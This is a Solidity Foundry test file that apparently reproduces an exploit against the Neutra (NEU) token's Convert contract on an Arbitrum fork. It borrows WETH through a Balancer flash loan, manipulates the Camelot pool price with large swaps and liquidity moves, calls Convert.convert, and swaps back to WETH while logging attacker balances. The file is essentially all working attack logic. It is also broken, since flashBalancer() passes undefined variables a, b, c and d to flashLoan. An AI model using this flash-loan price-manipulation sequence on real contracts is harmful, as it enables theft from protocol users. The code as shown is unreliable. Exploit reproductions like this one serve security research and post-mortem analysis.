// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract NeutraTest is Test {
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 NEU = IERC20(0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0);
    IERC20 NEU2 = IERC20(0x6609BE1547166D1C4605F3A243FDCFf467e600C3);
    IBalancerVault Balancer =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ICamelotRouter Camelot =
        ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
    ICamelotPair Pair =
        ICamelotPair(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440);
    ICamelotPair Pair2 =
        ICamelotPair(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4);
    IConvert Convert = IConvert(0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/arbitrum", 117189100);
        vm.label(address(WETH), "WETH");
        vm.label(address(NEU), "NEU");
        vm.label(address(Camelot), "Camelot Router");
    }

    function testExploit() public {
        WETH.approve(address(Camelot), type(uint256).max);
        NEU.approve(address(Camelot), type(uint256).max);

        console.log(
            "Attacker WETH Balance at start:",
            WETH.balanceOf(address(this))
        );

        flashBalancer();

        console.log(
            "Attacker WETH Balance at end:",
            WETH.balanceOf(address(this))/1e18
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        console.log(
            "Attacker WETH Balance after flashloan:",
            WETH.balanceOf(address(this))
        );
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(NEU);
        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.15 ether,
            0,
            path,
            address(this),
            address(this),
            block.timestamp + 1000
        );
        console.log("------------------------------");
        console.log("Swap successful, [WETH -> NEU]");
        uint neuAmount = NEU.balanceOf(address(this));
        console.log("Balance of WETH:", WETH.balanceOf(address(this)) / 1e18);
        console.log("Balance of NEU:", neuAmount / 1e18);
        console.log("------------------------------");
        Camelot.addLiquidity(
            address(WETH),
            address(NEU),
            0.15 ether,
            neuAmount,
            0,
            0,
            address(this),
            block.timestamp + 1000
        );
        uint lpAmount = Pair.balanceOf(address(this));
        console.log("Liquidity Added:", lpAmount/1e18);
        Pair.approve(address(Convert), type(uint256).max);
        console.log("Pair approved");
        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            849 ether,
            0,
            path,
            address(this),
            address(this),
            block.timestamp + 1000
        );
        neuAmount = NEU.balanceOf(address(this));
        console.log("------------------------------");
        console.log("Swap successful, [WETH -> NEU]");
        console.log("Balance of WETH:", WETH.balanceOf(address(this)) / 1e18);
        console.log("Balance of NEU:", neuAmount / 1e18);
        console.log("------------------------------");
        Convert.convert(lpAmount);
        console.log("Convert successful");
        console.log("Liquidity Left:", lpAmount);
        // address[] memory path2 = new address[](2);
        path[0] = address(NEU);
        path[1] = address(WETH);
        console.log("Attacker NEU balance:", neuAmount);
        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            neuAmount,
            0,
            path,
            address(this),
            address(this),
            block.timestamp + 1000
        );
        neuAmount = NEU.balanceOf(address(this));
        console.log("------------------------------");
        console.log("Swap successful, [NEU -> WETH]");
        console.log("Balance of WETH:", WETH.balanceOf(address(this)) / 1e18);
        console.log("Balance of NEU:", neuAmount / 1e18);
        console.log("Balance of LP:", Pair2.balanceOf(address(this)));
        console.log("------------------------------");
        uint wethAmount = WETH.balanceOf(address(this));
        Pair2.transfer(address(Pair2), Pair2.balanceOf(address(this)));
        console.log("Transfer success");
        (uint amount0, uint amount1) = Pair2.burn(address(this));
        console.log("Burn success");
        NEU2.approve(address(Camelot), type(uint256).max);
        console.log("Approve success");
        address[] memory path2 = new address[](2);
        path2[0] = address(NEU2);
        path2[1] = address(WETH);
        uint neu2Amount = NEU2.balanceOf(address(this));
        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            neu2Amount,
            0,
            path2,
            address(this),
            address(this),
            block.timestamp + 1000
        );
        console.log("Last swap successful");
        console.log("WETH left before repaying flashloan:",  WETH.balanceOf(address(this)) / 1e18);
        WETH.transfer(address(Balancer), 1000 ether);
    }


    function flashBalancer() internal {

        Balancer.flashLoan(a,b,c,d);
    }
}